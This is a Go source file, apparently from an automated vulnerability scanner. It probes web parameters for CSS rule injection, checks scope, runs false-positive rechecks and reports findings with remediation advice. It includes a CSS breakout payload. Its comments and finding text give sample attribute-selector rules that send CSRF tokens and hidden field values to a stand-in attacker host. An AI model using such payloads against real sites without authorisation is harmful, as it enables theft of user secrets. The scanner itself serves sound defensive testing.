package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

// cssInjectionParams reuses the common reflected-parameter name list.
var cssInjectionParams = danglingMarkupParams

// cssInjectionPayload attempts to close the current CSS property/rule and
// open a brand-new selector/declaration that fetches an external resource.
// A response that reflects this verbatim inside a <style> block proves an
// attacker can inject arbitrary CSS rules — including attribute-selector
// rules (e.g. input[value^="a"]{background:url(//attacker/a)}) that exfiltrate
// hidden form values, CSRF tokens, or other DOM secrets one character at a
// time without executing any JavaScript, silently bypassing a strict
// script-src CSP that would otherwise block classic XSS.
const cssInjectionPayload = `}*{background:url(//abh-cssinj-4d81.invalid/x)}/*`

const cssInjectionMaxAttempts = 10

// runCSSInjectionProbe is a bespoke, low-noise active probe for CSS-rule
// injection / attribute-selector data exfiltration. It only fires when the
// payload lands verbatim inside a <style> ... </style> block (confirmed via
// ClassifyReflectionContext) and survives a benign-value differential
// re-check, so a strict CSP blocking scripts does not hide this vector from
// scan coverage.
func (s *Service) runCSSInjectionProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}
	candidates := extractRuntimeEndpoints(input.Target, body, input.Scope, 8)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	attempts := 0
	for _, raw := range candidates {
		if attempts >= cssInjectionMaxAttempts {
			break
		}
		base, err := url.Parse(strings.TrimSpace(raw))
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}
		for _, param := range cssInjectionParams {
			if attempts >= cssInjectionMaxAttempts {
				break
			}
			probe := *base
			q := probe.Query()
			q.Set(param, cssInjectionPayload)
			probe.RawQuery = q.Encode()
			probeURL := probe.String()
			if !scope.IsURLInScope(probeURL, input.Scope) {
				continue
			}
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			ApplyAuthProfile(req, input.AuthProfile)
			resp, err := s.doRequestWithRetry(ctx, req, input.Options)
			attempts++
			if err != nil || resp == nil {
				continue
			}
			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			respHeader := resp.Header
			_ = resp.Body.Close()
			if !IsHTMLShape(respHeader) {
				continue
			}
			if !strings.Contains(string(respBody), cssInjectionPayload) {
				continue
			}

			// The payload must have landed inside a <style> block — a CSS
			// injection payload reflected as inert HTML text or inside an
			// attribute value is not exploitable via this vector.
			refCtx := ClassifyReflectionContext(string(respBody), cssInjectionPayload)
			if refCtx != ContextCSSValue || !PayloadEscapesContext(refCtx, cssInjectionPayload) {
				continue
			}

			// FP-reduction (base): a benign value must NOT already be
			// present verbatim in the response — rules out a static
			// template that always echoes the raw parameter.
			baselines, berr := s.phase1QueryBaselines(ctx, probeURL, param, "abh_benign_baseline", true, input, 256*1024)
			if berr == nil && phase1BaselineContains(baselines, cssInjectionPayload) {
				continue
			}

			// FP-reduction (verify): a two-control differential re-check —
			// stripped and random-benign replays must NOT reproduce the
			// marker — confirms the reflection is payload-specific.
			diffOutcome := phase1DifferentialQuery(ctx, s, input, "css-injection", probeURL, param, cssInjectionPayload, "abh_benign_baseline", 256*1024,
				func(_ context.Context, _ string, _ *http.Response, respBody []byte) (bool, error) {
					return strings.Contains(string(respBody), cssInjectionPayload), nil
				},
			)
			if diffOutcome.Ran && !diffOutcome.Confirmed {
				continue
			}

			curl := buildCurlReproducer(http.MethodGet, probeURL, input.AuthProfile, "", "")
			finding := model.Finding{
				ID:       "css-injection-" + hhSlug(probeURL),
				Category: "injection",
				Severity: model.SeverityMedium,
				Title:    "CSS rule injection enables scriptless data exfiltration",
				Description: fmt.Sprintf(
					"The parameter %q is reflected unencoded inside a <style> block at %s, allowing an attacker "+
						"to close the current declaration and inject arbitrary CSS rules. Attribute-selector CSS "+
						"rules (e.g. input[name=csrf][value^=\"a\"]{background:url(//attacker/a)}) can exfiltrate "+
						"hidden form field values, CSRF tokens, or other DOM secrets one character at a time by "+
						"observing which background-image requests fire — entirely without executing JavaScript. "+
						"This bypasses even a strict script-src CSP, which most scanners assume neutralizes "+
						"reflected-input risk once script contexts are ruled out.",
					param, probeURL,
				),
				Evidence:          fmt.Sprintf("Probe %s reflected the CSS-rule breakout payload unencoded inside a <style> block on parameter %q", probeURL, param),
				Recommendation:    "Never reflect untrusted input inside <style> blocks or CSS contexts. If dynamic styling is required, allowlist a fixed set of known-safe values (e.g. a theme name) server-side instead of echoing raw input, and apply CSS-specific escaping (CSS.escape / \\-hex-encoding) as defense in depth.",
				Confidence:        0.8,
				AffectedURL:       probeURL,
				AffectedParameter: param,
				CWE:               "CWE-79",
				OWASPCategory:     "A03:2021 - Injection",
				Sources:           []string{"active-scanner", "css-injection-probe"},
				ReproductionSteps: []string{
					fmt.Sprintf("Send GET %s", probeURL),
					"Inspect the HTML response and verify the CSS-breakout payload is reflected unencoded inside a <style> block.",
					"Replace the payload with an attribute-selector exfiltration rule targeting a real secret field and observe the resulting cross-origin request.",
				},
				PoC: curl,
				EvidenceFields: map[string]string{
					"validationType":    "active-probe",
					"payload":           cssInjectionPayload,
					"curlReproducer":    curl,
					"method":            http.MethodGet,
					"url":               probeURL,
					"param":             param,
					"payloadClass":      "css-injection",
					"responseShape":     ClassifyResponseShape(respHeader).String(),
					"reflectionContext": refCtx.String(),
					"oracleName":        "css_injection",
					"oracleVersion":     "v1",
				},
			}
			AttachDifferentialEvidence(&finding, diffOutcome)
			return []model.Finding{finding}
		}
	}
	return nil
}
